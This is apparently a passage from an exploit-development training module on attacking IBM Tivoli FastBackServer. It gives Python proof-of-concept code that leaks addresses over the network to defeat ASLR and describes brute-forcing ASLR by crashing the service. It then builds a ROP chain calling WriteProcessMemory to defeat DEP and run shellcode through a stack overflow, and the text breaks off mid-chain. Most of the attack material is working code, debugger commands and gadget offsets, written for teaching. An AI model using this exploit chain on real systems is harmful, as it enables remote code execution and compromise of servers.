Check for aslr
	.load narly
	!nmod
	
Finding Hidden Gems

FXCLI_DebugDispatch
Let's begin our investigation of the imported Win32 APIs by opening our previously-analyzed version of FastBackServer.exe in IDA Pro.

We'll navigate to the Imports tab and scroll through all the imported APIs. Eventually, we will find SymGetSymFromName,1 shown in Figure 6.

This API is particularly interesting since it can be used to resolve the memory address of any exported Win32 API by supplying its name.

Let's double-click on the imported API to continue our analysis in IDA Pro

Next, we'll perform a cross-reference of the API using the x hotkey, which displays the two results


Since both these addresses are the same, we know that this API is only used once. We can double-click on either address to jump to the basic block where the API is invoked


Our goal is to use static analysis to determine if we can send a network packet to reach this basic block. We'll need to find an execution path from FXCLI_OraBR_Exec_Command to the SymGetSymFromName API based on the opcode we provide.

To speed up our initial discovery process we'll perform a backward analysis. We'll first cross-reference the involved function calls, ignoring, for now, individual instructions and branching statements inside the current function.

We can begin the analysis by locating the beginning of the current function. Figure 10 shows the graph overview.



Clicking on the upper left-hand side of the graph overview reveals the start of the function and its name, which is FXCLI_DebugDispatch


Next, we'll perform a cross-reference by clicking on the highlighted section and pressing x to find which functions call it.


The cross-reference results reveal a single function, FXCLI_OraBR_Exec_Command.

If we double-click on the search result, we jump to the basic block that calls FXCLI_DebugDispatch


We now know that FXCLI_DebugDispatch is called from FXCLI_OraBR_Exec_Command. Next we must determine which opcode triggers the correct code path.

Moving up one basic block, we discover the comparison instruction


As displayed in the above figure, the code compares the value 0x2000 and a DWORD at an offset from EBP. As discussed in previous modules, this offset is used to specify the opcode.

This is definitely a good start since now we know that the opcode value of 0x2000 will trigger the correct code path, but we have not yet determined the buffer contents required to reach the correct basic block inside FXCLI_DebugDispatch.

Our next goal is to develop a proof of concept that will trigger the SymGetSymFromName call inside FXCLI_DebugDispatch. We'll reuse our basic proof of concept from the previous modules, and update the opcode value.
import socket
import sys
from struct import pack

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x2000)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x200)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += b"A" * 0x100
buf += b"B" * 0x100
buf += b"C" * 0x100

# Checksum
buf = pack(">i", len(buf)-4) + buf

def main():
        if len(sys.argv) != 2:
                print("Usage: %s <ip_address>\n" % (sys.argv[0]))
                sys.exit(1)
        
        server = sys.argv[1]
        port = 11460

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))

        s.send(buf)
        s.close()

        print("[+] Packet sent")
        sys.exit(0)


if __name__ == "__main__":
 	main()


Our modified proof of concept uses the opcode value 0x2000 along with a psCommandbuffer consisting of 0x100 As, Bs, and Cs

Since WinDbg is already attached to FastBackServer, we can place a breakpoint on the comparison of the opcode value. Because WDEG cannot randomize the base address of FastBackServer, we can continue using the static addresses found in IDA Pro for our breakpoint.
	bp 0x56d1ef
	g
	


We can now single-step through the comparison to the call into FXCLI_DebugDispatch. We'll dump the arguments here, as shown in Listing 6.
	dd esp L3
	dd 0d4d3b30



Arbitrary Symbol Resolution

Now, we're ready to step into FXCLI_DebugDispatch to determine how to reach the correct basic block.

As mentioned, FXCLI_DebugDispatch is a large function. The graph overview from IDA Pro is repeated


The figure above also reveals many branching statements within the function. These types of branching code paths are typically the result of if and else statements in the C source code.

When we start to trace through the function, we discover a repeating pattern that begins from the first basic block.

The code of the first basic block from FXCLI_DebugDispatch is shown


In the first highlighted portion of the basic block, FXCLI_DebugDispatch calls _ml_strbytelen. This is a wrapper function around strlen,1 a function that finds the length of the string given as an argument.

The argument string in this case is "help", which means _ml_strbytelen should return the value "4".

Next, FXCLI_DebugDispatch calls _ml_strnicmp, which is a wrapper around strnicmp.2 This API compares two strings up to a maximum number of characters, ignoring the case.

In our case, the maximum number of characters to compare is the result of the _ml_strbytelen function, which is the value "4". That means _ml_strnicmp performs a comparison between "help" and the contents at the memory address in Str1.

We can verify our static analysis and obtain the contents of the unknown string by single-stepping until the call to ml_strnicmp and inspecting the API's three arguments:
	dd esp L3
	da 0085dbec 
	da 0d4d3b30


The output confirms that the maximum size argument contains the value "4". We also observe that the dynamic string comes from the psCommandBuffer, which is under our control.

Since the first four characters of the strings do not match, the API returns a non-zero value:
	r eax



The return value is used in a TEST instruction, along with a JNE. Because the return value is non-zero, we execute the jump.

From here, the ml_strnicmp call we have just analyzed is repeated for different strings in a series of if and else statements visually represented in the graph overview. Figure 17 shows the next two string comparisons.


As we will soon confirm, these basic assembly blocks can be translated to a series of branch statements in C. When each string comparison succeeds, it leads to the invocation of a FastBackServer internal function.

Now that we understand the high level flow of the function, let's speed up our analysis by navigating to the basic block just prior to the SymGetSymFromName call. Here we find the comparison shown in Figure 18.


Based on the comparison, we know that our input string must be equal to "SymbolOperation".

We can pass the comparison by updating our proof of concept, as shown

...
# psCommandBuffer
buf += b"SymbolOperation"
buf += b"A" * (0x100 - len("SymbolOperation"))
buf += b"B" * 0x100
buf += b"C" * 0x100
...

We'll set the input buffer to the string "SymbolOperation" followed by A's.

Next, we'll clear any previous breakpoints in WinDbg, set a breakpoint on the call to ml_strnicmp at 0x57e84a, and continue execution. We'll reach the breakpoint we just set with old data from our previous proof of concept, so we need to continue execution once more before launching the updated proof of concept.

Clear breakpoints with bc
	bc
	bp 0x57e84a

When the updated proof of concept is executed, we trigger the breakpoint.
	da poi(esp)
	p
	r eax
	


Since we submitted the correct string, the TEST instruction will ensure we take the code path leading to the SymGetSymFromName call.

Let's set a breakpoint on the call to SymGetSymFromName at 0x57e984 and continue execution.
	bp 0057e984
	g
	



As shown in the listing, our proof of concept reaches the call to SymGetSymFromName. Next, we need to understand its arguments so we can resolve a function address.

Let's review the function prototype3
	BOOL IMAGEAPI SymGetSymFromName(
	  HANDLE           hProcess,
	  PCSTR            Name,
	  PIMAGEHLP_SYMBOL Symbol
	);

we'll explore the last two arguments. The second argument, Name, is a pointer to the symbol name that will be resolved. It must be provided as a null-terminated string.

We can check the current content of the second argument with WinDbg.
	da poi(esp+4)
	
From Listing 13, we discover that the second argument is our input string that was appended to the "SymbolOperation" string.

This means we can provide the name of an arbitrary Win32 API and have its address resolved by SymGetSymFromName. Very nice.

The last argument is a structure of type PIMAGEHLP_SYMBOL,4 as shown in Listing 14.
	typedef struct _IMAGEHLP_SYMBOL {
	  DWORD SizeOfStruct;
	  DWORD Address;
	  DWORD Size;
	  DWORD Flags;
	  DWORD MaxNameLength;
	  CHAR  Name[1];
	} IMAGEHLP_SYMBOL, *PIMAGEHLP_SYMBOL;

This structure is initialized within the same basic block (address 0x57E957) and populated by SymGetSymFromName. We are interested in the second field of this structure, which will contain the resolved API's memory address returned by SymGetSymFromName. If all goes well, we'll later use this address to bypass ASLR.

Let's try to resolve the memory address of an API by updating our proof of concept to contain the name of the Win32 WriteProcessMemory API, which we can use to bypass DEP.

# psCommandBuffer
symbol = b"SymbolOperationWriteProcessMemory" + b"\x00"
buf += symbol + b"A" * (100 - len(symbol))
buf += b"B" * 0x100
buf += b"C" * 0x100

We'll remove the breakpoint on the call to ml_strnicmp at 0x57e84a and let execution continue. Now we're ready to execute the updated proof of concept.
	bc 0
	g
	da poi(esp+4)


This reveals the expected input string, "WriteProcessMemory".

Before executing SymGetSymFromName, we'll dump the contents of the address field in the PIMAGEHLP_SYMBOL structure.
	dd esp+8 L1
	dds 0db5dca0+4 L1
	p
	dds 0db5dca0+4 L1
	


When we inspect the contents of the second field in the PIMAGEHLP_SYMBOL structure before the call, we find it is empty (0x000000).

However, after the call to SymGetSymFromName, we notice that it has been populated by the API and contains the address of WriteProcessMemory.

From our last test, it seems that we should be able to abuse the FXCLI_DebugDispatch function. However, we still have to determine if we are able to read the results returned by SymGetSymFromName from the network. If we can, we should be able to bypass ASLR and combine that with a DEP bypass through ROP to obtain code execution.

Returning the Goods

We know that we can trigger the execution of SymGetSymFromName through FXCLI_DebugDispatch and resolve the address of an arbitrary function. Next, we need to figure out how to retrieve the values.

First, we must navigate our way out of the FXCLI_DebugDispatch function. Let's inspect the return value of SymGetSymFromName to determine which path is taken next.
	r eax
	p
	p


The highlighted jump instruction is not executed because the return value is non-null.

Next, we encounter a large basic block that performs several string manipulations. The first of these manipulations is displayed in Figure 19.


We can observe that the output of the sprintf call is stored on the stack at an offset from EBP+arg_0. Two more calls to sprintf follow, where the output is stored at an offset from EBP+arg_0.

We're only interested in the final string, so we can dump the storage address at EBP+arg_0 and inspect it at the end of the basic block. To find the value of arg_0, we'll first navigate to the start of FXCLI_DebugDispatch.


Since arg_0 translates to the value "8", we can dump the contents of EBP+8 at the start of the basic block:
	dd ebp+8 L1


Next, let's set a breakpoint on the TEST instruction at 0x57ea23, which is at the end of the basic block where sprintf is called three times.

After we hit the breakpoint, we find the final contents of the string buffer.
	bp 0057ea23
	g
	da 00ede3a8


This shows that the buffer contains, among other things, the memory address of WriteProcessMemory.

At this point the execution leads us to the end of the function where we return to FXCLI_OraBR_Exec_Command (address 0x573821, Figure 21) just after the call to FXCLI_DebugDispatch.



The first comparison after returning is a NULL check of EAX, which is the return value from FXCLI_DebugDispatch.

To find the return value, we can let the function return in WinDbg and dump EAX.
	r eax
	p
	p
	p
	

As shown in the listing above, the return value in EAX is 1, so the jump is not taken.

Following execution, we'll eventually reach the basic block shown


This figure shows many code paths converging at this address.

The comparison in this basic block is performed against a variable we do not control. To learn what happens at runtime, we need to single-step in WinDbg until we reach the basic block
	p
	p
	p
	


The first jump is taken (as shown in Listing 22), after which we encounter another comparison. This branch also uses a variable that is out of our control, and the second jump is not taken.

Next, we arrive at the basic block displayed


The key point in this block is the call to FX_AGENT_S_GetConnectedIpPort. Keeping in mind our goal of returning the results from SymGetSymFromName to us via a network packet, this function name seems promising.

Observing this basic block more closely, the addresses in ECX and EDX come from an LEA instruction. When this instruction is used just before a CALL, it typically indicates that the memory address stored in the register (ECX and EDX in this case) is used to return the output of the invoked function. Let's verify this.

We'll continue to the function call and then dump the memory of the two stack variables pointed to by the LEA instructions, before and after the call.
	dd ebp-12550 L1
	dd ebp-61BC L1
	p
	dd ebp-12550 L1
	dd ebp-61BC L1
	

we notice that the two memory locations passed as arguments through the LEA instructions are indeed populated during this call. Let's try to understand what these values represent.

Because of the function's name, we can guess that these values relate to an existing IP address and port. Typically, a TCP connection is created by calling the connect1 API, which has the function prototype shown
	int WSAAPI connect(
	  SOCKET         s,
	  const sockaddr *name,
	  int            namelen
	);
	
The second argument in this function prototype is a structure called sockaddr. In IP version 4, this structure is called sockaddr_in

 the structure of sockaddr_in as documented on MSDN.
struct sockaddr_in {
        short   sin_family;
        u_short sin_port;
        struct  in_addr sin_addr;
        char    sin_zero[8];
};

The IP address is represented as a structure of type in_addr, while the port is specified as an unsigned word.

As shown in Listing 26, the in_addr structure3 represents the IP address with each octet as a single byte. We can obtain the IP address from the second DWORD returned by FX_AGENT_S_GetConnectedIpPort.
	dd ebp-61BC L1
	? c0;? a8;? 77;? 78
	


If each of the bytes are translated from hexadecimal to decimal in reverse order, they reveal the IP address our of Kali Linux machine (192.168.119.120).

We can also reverse the order of the DWORD and convert it to decimal to reveal the port number, as shown below.
	dd ebp-12550 L1
	? d020
	


Let's verify our findings by opening a command prompt with administrative permissions on the Windows 10 student machine and using the netstat command to list the TCP connections. We'll supply the -anbp flag to show only TCP connections.
	netstat -anbp tcp


This is promising, as we are hoping to receive the output of FXCLI_DebugDispatch through a network packet, and the most logical way to do this from the application perspective is to reuse the TCP connection we created to send our request.

Let's continue verifying our hypothesis by attempting to locate a function that transmits data.

After the code providing the IP address and TCP port number, there are a series of checks on the values retrieved by FX_AGENT_S_GetConnectedIpPort. After reaching the basic block shown in Figure 24, we locate the function FXCLI_IF_Buffer_Send.


This function name suggests that some data will be sent over the network. Combined with the check for an active connection to our Kali machine, we can guess that the data supplied to this function will be sent to us as a network packet.

Let's continue our dynamic analysis by single-stepping until the call to FXCLI_IF_Buffer_Send. Then we'll dump the contents of the first function argument.
	da poi(esp)



The text string containing the address of WriteProcessMemory that was returned by FXCLI_DebugDispatch is supplied as an argument to FXCLI_IF_Buffer_Send.

To confirm data transmission, we could go into the call in search of a call to send. However, it's much easier to instead modify our proof of concept.

We can update our proof of concept to receive data after sending a request packet as shown in Listing 30.
def main():
        if len(sys.argv) != 2:
                print("Usage: %s <ip_address>\n" % (sys.argv[0]))
                sys.exit(1)
        
        server = sys.argv[1]
        port = 11460

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))

        s.send(buf)

        response = s.recv(1024)
        print(response)

        s.close()

        print("[+] Packet sent")
        sys.exit(0)

Listing 30 shows that the proof of concept will print any data received through the recv method to the console.

To confirm our hypothesis, we'll remove all the breakpoints in WinDbg, let the execution continue, and run the updated proof of concept.
	python3 poc.py 192.168.120.10
	


Listing 31 shows that we have received the output from FXCLI_DebugDispatch, which includes the address for WriteProcessMemory. At this point we have implemented a rudimentary ASLR bypass. Excellent!

Finally, we'll filter the data to only print the address. We can do this by searching for the string "Address is:", as shown in Listing 32.
def parseResponse(response):
    """ Parse a server response and extract the leaked address """
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
       if line.find(pattern) != -1:
          address = int((line.split(pattern)[-1].strip()),16)
    if not address:
       print("[-] Could not find the address in the Response")
       sys.exit()
    return address

To make the code more readable and modular, we placed the parsing code inside a separate function called parseResponse.

Inside this method, we locate the address by splitting the response by newlines and searching for the "Address is:" string.

Once the string is found, our code extracts the address and converts it to hexadecimal.

Finally, we'll call parseResponse from the main method, supply the response packet as an argument, and print the results to the console.
	python3 poc.py 192.168.120.10
	


Occasionally, when running our proof of concept, we fail to resolve the address of WriteProcessMemory. This is why the parseResponse method checks for a populated address variable. If our proof of concept fails, as it does in Listing 34, we can rerun it until it succeeds.


---------------------------------------------------------------
Expanding our exploit ASLR

When we resolved the address of WriteProcessMemory, it also gave us a pointer to kernel32.dll, meaning we could use that DLL to locate ROP gadgets. Unfortunately, since every monthly update changes the ROP gadget offsets, our exploit would become dependent on the patch level of Windows.

We can create a better exploit by leaking the address of a function from one of the IBM modules shipped with FastBackServer, meaning our exploit will only be dependent on the version of Tivoli.

In the next sections, we will locate a pointer to an IBM module that we can use for ROP gadgets to bypass DEP.

Leaking an IBM Module
In order to proceed, we must first select a good candidate IBM module for our gadgets. To do this, we'll determine the name of the loaded modules as well as their location on the filesystem. Once we decide which module to use, we will leak the address of an exported function using the logical vulnerability. Finally, using the leaked address, we'll gather the base address of the IBM module in order to build our ROP chain dynamically.

Let's start by enumerating all loaded IBM modules in the process. We can do this in WinDbg by first breaking execution and then using the lm command along with the f flag to list the file paths.
	lm f
	


The output in Listing 35 reveals ten IBM DLLs and the FastBackserver executable.

Next, we need to select a module with an exported function we can resolve that contains desirable gadgets. We must ensure it does not contain 0x00 in the uppermost byte of the base address, which excludes the use of FastBackServer.exe.

Multiple modules meet these requirements, so we'll start by arbitrarily choosing libeay32IBM019.dll, located in C:\Program Files\ibm\gsk8\lib\N\icc\osslib.

Next, we need to locate the function we want to resolve. Let's copy libeay32IBM019.dll to our Kali Linux machine and load it into IDA Pro.

Once IDA Pro has completed its analysis, we can navigate to the Export tab and pick any function that does not contain a bad character.



In our case, we'll use the N98E_CRYPTO_get_net_lockid function, which can be found as the first entry when sorting by Address in IDA Pro (Figure 25).

This function is located at offset 0x14E0 inside the module. Once we leak the function address, we'll need to subtract that offset to get the base address of the DLL.

Listing 36 displays an updated proof of concept that implements this logic.
# psCommandBuffer
symbol = b"SymbolOperationN98E_CRYPTO_get_new_lockid" + b"\x00"
buf += symbol + b"A" * (100 - len(symbol))
buf += b"B" * 0x100
buf += b"C" * 0x100

# Checksum
buf = pack(">i", len(buf)-4) + buf

def main():
        if len(sys.argv) != 2:
                print("Usage: %s <ip_address>\n" % (sys.argv[0]))
                sys.exit(1)
        
        server = sys.argv[1]
        port = 11460

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))

        s.send(buf)

        response = s.recv(1024)
        FuncAddr = parseResponse(response)
        libeay32IBM019Base = FuncAddr - 0x14E0
        print(str(hex(libeay32IBM019Base)))

        s.close()

        print("[+] Packet sent")
        sys.exit(0)

if __name__ == "__main__":
 	main()

We can test our updated exploit by continuing execution within WinDbg and launching our proof of concept. Our exploit's results are shown below.
	python3 poc.py 192.168.120.10


IS THAT A BAD CHARACTER?
In a previous module, we exploited a memory corruption vulnerability triggered through opcode 0x534 in FastBackServer. We determined during exploit development that the characters 0x00, 0x09, 0x0A, 0x0C, 0x0D, and 0x20 break our exploit by truncating the buffer.

The vulnerability is present due to unsanitized input to the scanf call. Since we will be leveraging that vulnerability again, we need to avoid the same bad characters in our updated exploit.

Keeping this in mind, we can start by checking for bad characters in the base address of the selected module. We can do this by executing the ASLR disclosure multiple times across application restarts and inspecting the upper two bytes of the module base address.

After multiple tests, we observe that there is a small risk that the base address of libeay32IBM019 will contain a bad character due to ASLR randomization.

One such occurrence is illustrated in Listing 38.
	python3 poc.py 192.168.120.10


In the listing above, the second-to-highest byte contains the value 0x20, which is a bad character.

If we use this base address to set up a ROP chain, along with the relevant gadget offsets, the bad character will truncate the buffer and the exploit attempt will fail. We must pick a different module, or risk a denial-of-service condition while trying to leverage the vulnerability. In our case, we may have another option.

To provide greater reliability, some server-side enterprise suites run a service that monitors its applications, and can take action if one of them crashes. If the service detects a crash, it will restart the process, ensuring that the application remains accessible.

When the process restarts, ASLR will randomize the base address of the module. This provides an opportunity for the attacker, as there is a chance that the new randomized address is clean. Since we can typically "restart" the application an arbitrary number of times, we can effectively perform a brute force attack until we encounter a good address.

The associated services for Tivoli are shown



The FastBack WatchDog service seems promising as its name suggests some sort of process monitoring.

To verify this, we'll use Process Monitor1 (ProcMon), which, among other things, can monitor process creation. We'll open ProcMon.exe as an administrator from C:\Tools\SysInternalsSuite and navigate to Filter > Filter... to open the process monitor filter window.

Let's set up a filter rule by selecting Operation in the first column and contains in the second column. We'll enter "Process" as the term to include, as shown in Figure 27. With this search we are filtering entries such as "Process Start", "Process Exit", etc.


Once the rule is configured, we'll Add it, Apply it, and enable it with OK.

Next, we can observe what happens when FastBackServer crashes. We'll simulate a crash by attaching WinDbg to the process and then closing WinDbg. Eventually, FastBackServer is restarted, as shown in Figure 28.


Once the process restarts, we'll resend the packet that calls FXCLI_DebugDispatch and observe the new base address, which does not contain the bad character.
	python3 poc.py 192.168.120.10


BYPASSING DEP WITH WRITEPROCESSMEMORY

Now that ASLR is taken care of, we need to bypass DEP. In a previous module, we did this by modifying the memory protections of the stack where the shellcode resides.

Earlier, we used VirtualAlloc to bypass DEP. That technique still applies, but we will expand our ROP skills by taking a different approach.

We can copy our shellcode from the stack into a pre-allocated module's code page through the Win32 WriteProcessMemory1 API.

In our case, we'll copy our shellcode into the code page of libeay32IBM019. The code page is already executable, so we won't violate DEP when the shellcode is executed from there.

A typical code page is not writable, but WriteProcessMemory takes care of this by making the target memory page writable before the copy, then reverting the memory protections after the copy.

In the next sections we'll unpack the API's required arguments and create a ROP chain that calls it.

WRITEPROCESSMEMORY
Our current goal is to abuse WriteProcessMemory to bypass DEP and gain code execution inside the code section of libeay32IBM019. However, before we create a ROP chain to call WriteProcessMemory, we need to understand what arguments it accepts.
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

hProcess, is a handle to the process we want to interact with. Since we want to perform a copy operation inside the current process, we'll supply a pseudo handle. The pseudo handle is a special constant currently set to -1.1 When the API is invoked, it translates the pseudo handle to the actual process handle and allows us to effectively ignore this argument.

The second argument, lpBaseAddress, is the absolute memory address inside the code section where we want our shellcode to be copied. In principle, this address could be anywhere inside the code section because it has the correct memory protections, but overwriting existing code could cause the application to crash.

To avoid crashing the application, we need to locate unused memory inside the code section and copy our shellcode there. When the code for an application is compiled, the code page of the resulting binary must be page-aligned. If the compiled opcodes do not exactly fill the last used page, it will be padded with null bytes.

Exploit developers refer to this padded area as a code cave. The easiest way to find a code cave is to search for null bytes at the end of a code section's upper bounds. Let's begin our search by navigating the PE header2 to locate the start of the code pages.

We'll use WinDbg to find the code cave, so let's attach it to FastBackServer and pause execution.

As we learned in a previous module, we can find the offset to the PE header by dumping the DWORD at offset 0x3C from the MZ header. Next, we'll add 0x2C to the offset to find the offset to the code section, as shown in Listing 41.
	dd libeay32IBM019 + 3c L1
	dd libeay32IBM019 + 108 + 2c L1
	? libeay32IBM019 + 1000

	
Let's use the !address command to collect information about the code section.
	!address 031f1000

	
we've obtained the upper bound of the code section. To locate a code cave, we can subtract a sufficiently-large value from the upper bound to find unused memory large enough to contain our shellcode.

Instead of parsing the PE header manually, we can use the !dh3 WinDbg command to display all the headers.

To check if a code cave is indeed present, let's subtract the arbitrary value 0x400, which should be large enough for our shellcode, from the upper bound:
	dd 03283000-400
	? 03283000-400 - libeay32IBM019
	!address 03282c00
	

This reveals that we have found a code cave that provides 0x400 bytes of memory. In addition, the memory protection is PAGE_EXECUTE_READ, as expected.

The code cave starts at offset 0x92c00 into the module. This offset contains a null byte, so we'll use the offset 0x92c04 instead.

Summarizing the information we gathered so far, we can use offset 0x92c04 together with the leaked module base address as the second argument (lpBaseAddress) to WriteProcessMemory.

The final three arguments for WriteProcessMemory are simpler. Let's review the function prototype, provided again below.
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

Because of the stack overflow, our shellcode will be located on the stack after we trigger the vulnerability. Therefore, for the third API argument, we must supply the shellcode's stack address. The fourth argument will be the shellcode size.

The last argument needs to be a pointer to a writable DWORD where WriteProcessMemory will store the number of bytes that were copied. We could use a stack address for this pointer, but it's easier to use an address inside the data section of libeay32IBM019, as we do not have to gather it at runtime.

We can use the !dh4 command to find the data section's start address, supplying the -a flag to dump the name of the module along with all header information.
	!dh -a libeay32IBM019



we learn that the offset to the data section is 0xD5000, and its size is 0xF018.

We need to check the contents of the address to ensure they are not being used and to verify memory protections. Section headers must be aligned on a page boundary, so let's dump the contents of the address just past the size value.
	? libeay32IBM019 + d5000 + f018  + 4
	dd 032d401c
	!vprot 032d401c
	? 032d401c - libeay32IBM019
	


we found a writable, unused DWORD inside the data section, which is exactly what we need. It is located at offset 0xe401c from the base address.

Now that we know what arguments to supply to WriteProcessMemory, let's implement a call to this API using ROP.

First, we need to reintroduce the code we previously used to trigger the buffer overflow vulnerability in the scanf call (opcode 0x534) into our proof of concept.

Second, we'll insert a ROP skeleton consisting of the API address, return address, and arguments to use WriteProcessMemory instead of VirtualAlloc. In the previous FastBackServer exploit, we used absolute addresses for ROP gadgets, but in this case (because of ASLR), we'll identify every gadget as libeay32IBM019's base address plus an offset.

lists the code required to create a ROP skeleton for WriteProcessMemory.
...
libeay32IBM019Func = leakFuncAddr(b"N98E_CRYPTO_get_new_lockid", server)
dllBase = libeay32IBM019Func - 0x14E0
print(str(hex(dllBase)))

# Get address of WriteProcessMemory
WPMAddr = leakFuncAddr(b"WriteProcessMemory", server)
print(str(hex(WPMAddr)))

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x700)  # 1st memcpy: size field
buf += pack("<i", 0x0)    # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)    # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
wpm  = pack("<L", (WPMAddr))    		    # WriteProcessMemory Address
wpm += pack("<L", (dllBase + 0x92c04)) 	# Shellcode Return Address
wpm += pack("<L", (0xFFFFFFFF)) 		      # pseudo Process handle
wpm += pack("<L", (dllBase + 0x92c04)) 	# Code cave address 
wpm += pack("<L", (0x41414141)) 		      # dummy lpBuffer (Stack address) 
wpm += pack("<L", (0x42424242)) 		      # dummy nSize
wpm += pack("<L", (dllBase + 0xe401c)) 	# lpNumberOfBytesWritten
wpm += b"A" * 0x10

offset = b"A" * (276 - len(wpm))
...

As covered in an earlier exercise, we'll first gather the base address of libeay32IBM019, which we'll store in the dllBase variable.

Previously, when we used VirtualAlloc without an ASLR bypass, we had to generate and update all the function arguments (including the return and API addresses) at runtime with ROP.

This case is different. Our ASLR bypass resolves the address of WriteProcessMemory along with the code cave address, which is both the return address and the destination address for our shellcode. The last argument, lpNumberOfBytesWritten, is also calculated as an address inside the data section without the help of a ROP gadget.

As a result, we only need to dynamically update two values with ROP. We'll update the address of the shellcode on the stack (because it changes each time we execute the exploit) and the size of the shellcode, avoiding NULL bytes.

We should note that the 276-byte offset from the start of the buffer (used to overwrite EIP) has not changed from the previous module exploit.

We'll begin updating these values dynamically by focusing on the shellcode's dummy value on the stack. Repeating an earlier technique, we'll obtain a copy of ESP in a different register, align it with the dummy value on the stack, and overwrite it.

An excellent candidate is shown in Listing 48.
0x100408d6: push esp ; pop esi ; ret 
Gadget to obtain a copy of esp

We can use this gadget to cleanly obtain a copy of ESP in ESI.

From the output of rp++ shown above, we notice that the address of the gadget is 0x100408d6. This address is an absolute address, not an offset. Because of ASLR, we cannot directly use this address, so we'll need to calculate the offset.

When we execute rp++, it parses the DLL's PE header to obtain the preferred base load address. This address will be written as the gadget address in the output file. We'll use WinDbg to find the preferred base load address for libeay32IBM019.dll, and subtract the value of that address from each gadget we select in our output file.

The preferred base load address is called the ImageBase in the PE header and is stored at offset 0x34.
	dd libeay32IBM019 + 3c L1
	dd libeay32IBM019 + 108 + 34 L1
	
In the case of libeay32IBM019.dll, this turns out to be 0x10000000 as shown in Listing 49.

The preferred base load address of libeay32IBM019.dll matches the upper most byte in the gadget addresses given in the rp++ output. To obtain the offset, we can simply ignore the upper 0x100 value.

We are now ready to create the first part of the ROP chain that replaces the dummy stack address with the shellcode address. We can use a similar approach we used in a previous module but with gadgets from libeay32IBM019.dll.

The first step is to align the EAX register with the shellcode address on the stack.

eip = pack("<L", (dllBase + 0x408d6)) # push esp ; pop esi ; ret

# Patching lpBuffer
rop = pack("<L", (dllBase + 0x296f))    # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242))         # junk into esi
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
rop += pack("<L", (0x88888888))
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
rop += pack("<L", (0x77777878))
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret

shows that the gadget we use to overwrite EIP will copy the stack pointer into ESI. Next, we'll get the stack address from ESI into EAX and increase it, pointing it to the shellcode address on the stack.

The EAX alignment shown in Listing 50 reuses a technique from a previous module in which we subtract a small value from EAX by, paradoxically, adding a large value in order to avoid NULL bytes.

In the next step, we update the lpBuffer dummy argument. The gadget we'll use to patch the dummy argument uses the "MOV [EAX], ECX" instruction, so we must move the address of the shellcode into ECX first. We also need to obtain the stack address where the lpBuffer argument should be patched in EAX. A ROP chain to perform this is shown in Listing 51.

rop += pack("<L", (dllBase + 0x8876d))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
rop += pack("<L", (0x42424242))         # junk into esi
rop += pack("<L", (dllBase + 0x48d8c))  # pop eax ; ret 
rop += pack("<L", (0x42424242))         # junk for ret 0x10
rop += pack("<L", (0x42424242))         # junk for ret 0x10
rop += pack("<L", (0x42424242))         # junk for ret 0x10
rop += pack("<L", (0x42424242))         # junk for ret 0x10
rop += pack("<L", (0xfffffee0))         # pop into eax
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x1fd8))   # mov [eax], ecx ; ret

As highlighted in the ROP chain above, the first gadget uses a return instruction with an offset of 0x10. As a result, execution will return to the "POP EAX" gadget's address on the stack, and the stack pointer is then increased by 0x10. Because of this we need to insert 0x10 junk bytes before the value (0xfffffee0) that is popped into EAX.

Next, our ROP chain pops the value 0xfffffee0 into EAX and adds the contents of ECX to it. 0xfffffee0 corresponds to -0x120, which is the correct value to align EAX with the lpBuffer placeholder (shellcode pointer) on the stack. Finally, the last gadget overwrites the lpBuffer argument with the real shellcode address.

To test this, let's restart FastBackServer and attach WinDbg. If we place a breakpoint on the gadget that writes the real shellcode address on the stack (libeay32IBM019+0x1fd8), we can step over the mov instruction and display the updated ROP skeleton on the stack.
	bp libeay32IBM019+0x1fd8
	g
	p
	dd eax-10 L7
	dd 0dbbe41c L8


With the shellcode address correctly patched, our ROP skeleton on the stack is almost complete. Next, we need to overwrite the dummy shellcode size, which in the listing above is represented by 0x42424242.

As with prior ROP chains, we should reuse as many gadgets as possible when we need to repeat similar actions.

The shellcode size does not have to be precise. If it is too large, additional stack content will simply be copied as well. Most 32-bit Metasploit-generated shellcodes are smaller than 500 bytes, so we can use an arbitrary size value of -524 (0xfffffdf4) and then negate it to make it positive.

Listing 53 shows the ROP chain for this step.
# Patching nSize
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0x408dd)) # push eax ; pop esi ; ret 
